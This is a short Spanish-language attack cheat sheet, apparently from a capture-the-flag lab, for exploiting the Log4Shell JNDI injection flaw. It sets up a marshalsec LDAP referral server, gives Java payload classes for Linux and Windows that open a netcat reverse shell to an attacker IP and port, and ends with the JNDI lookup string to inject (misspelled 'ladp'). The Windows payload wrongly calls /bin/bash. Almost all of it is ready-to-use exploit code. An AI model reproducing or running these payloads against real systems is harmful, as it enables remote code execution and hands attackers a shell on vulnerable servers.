
```bash
# instalar maven
sudo apt install maven -y

# instalar marshalsec
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests

# lebantar server ldap 
# en directorio marshalsec/
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<ip atacante>:8000/#Exploit"

```

- Exploit linux
```java
public class Exploitlin { 
    static {
    try { 
    java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.10.14.175 1234"); 
    } catch (Exception e) { 
    e.printStackTrace(); 
    } 
    } 
    }
```

- Exploit windows

```java
public class Exploitwin { 
static { 
try { 
java.lang.Runtime.getRuntime().exec("nc.exe 10.10.14.175 1234 -e /bin/bash"); 
} catch (Exception e) { 
e.printStackTrace(); 
} 
} 
}
```

- compilar
```bash
javac Exploit.java -source 8 -target 8
```



```
<url>?${jndi:ladp://ip:puerto/exploit}
```